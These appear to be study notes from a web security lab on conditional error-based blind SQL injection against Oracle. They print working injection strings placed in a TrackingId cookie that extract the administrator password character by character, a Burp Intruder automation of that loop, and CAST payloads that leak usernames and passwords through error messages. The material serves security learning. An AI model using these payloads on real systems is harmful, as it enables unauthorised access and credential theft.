# Blind SQL Injection - Conditional Errors

## Overview

Conditional error-based SQL injection is a form of blind SQL injection where the application does not directly return the query result.

Instead, we determine whether a SQL condition is TRUE or FALSE by observing whether the application generates a database error.

---

## Conditional Errors

The basic idea is to make the database produce an error only when a specific condition is TRUE.

Example:

    CASE WHEN (1=2) THEN 1/0 ELSE 'a' END

Since `1=2` is FALSE, the division by zero is not executed and no error occurs.

When the condition is TRUE:

    CASE WHEN (1=1) THEN 1/0 ELSE 'a' END

The database attempts to divide by zero and generates an error.

Therefore:

    TRUE  → Database error
    FALSE → No database error

---

## Oracle-Specific Testing

In the lab, the application used an Oracle database.

Initial testing included:

    TrackingId=xyz'

Then modifying the syntax to determine how the application and database handled the input.

Oracle's `DUAL` table was also used:

    TrackingId=xyz'||(SELECT '' FROM dual)||'

A non-existent table could be used to confirm that database errors were observable:

    TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'

---

## Using Conditional Errors to Extract Data

Once conditional errors are confirmed, a condition can be created around a specific character of a value.

Example:

    TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

The important part is:

    SUBSTR(password,1,1)

This selects the first character of the administrator's password.

The condition:

    SUBSTR(password,1,1)='a'

checks whether that character is `a`.

The result can then be interpreted as:

    500 → Condition TRUE → Character is correct
    200 → Condition FALSE → Character is incorrect

---

## Using Burp Intruder

Burp Intruder can automate the character enumeration.

The character being tested can be marked as the payload position:

    ...SUBSTR(password,1,1)='§a§'...

Possible payloads can include:

    a
    b
    c
    ...
    z
    0
    1
    2
    ...
    9

The HTTP status code can then be used as the response indicator.

After finding the first character, the position is changed:

    SUBSTR(password,2,1)

Then:

    SUBSTR(password,3,1)

And so on until the value has been extracted.

---

## Verbose SQL Errors

Another form of error-based SQL injection occurs when the database error message reveals useful information.

For example, forcing a type conversion error:

    ' AND CAST((SELECT 1) AS int)--

A query can then be used inside the error-generating expression:

    ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

If the database includes the invalid value in its error message, sensitive information such as a username may be exposed.

The same technique can potentially expose other values:

    ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

---

## Practical Workflow

    1. Identify a possible blind SQL injection
            ↓
    2. Determine whether database errors are observable
            ↓
    3. Create a TRUE/FALSE conditional error
            ↓
    4. Use the error as the response indicator
            ↓
    5. Extract data character by character
            ↓
    6. Automate the process with Burp Intruder

---

## Key Takeaways

- Conditional error-based SQLi uses database errors as a TRUE/FALSE signal.
- A database error can indicate that a specific condition was TRUE.
- `CASE WHEN` can be used to trigger an error conditionally.
- `SUBSTR()` can be used to test individual characters.
- Burp Intruder can automate character enumeration.
- Verbose database errors may directly reveal sensitive information.
- Error-based techniques depend heavily on the database type and its specific syntax.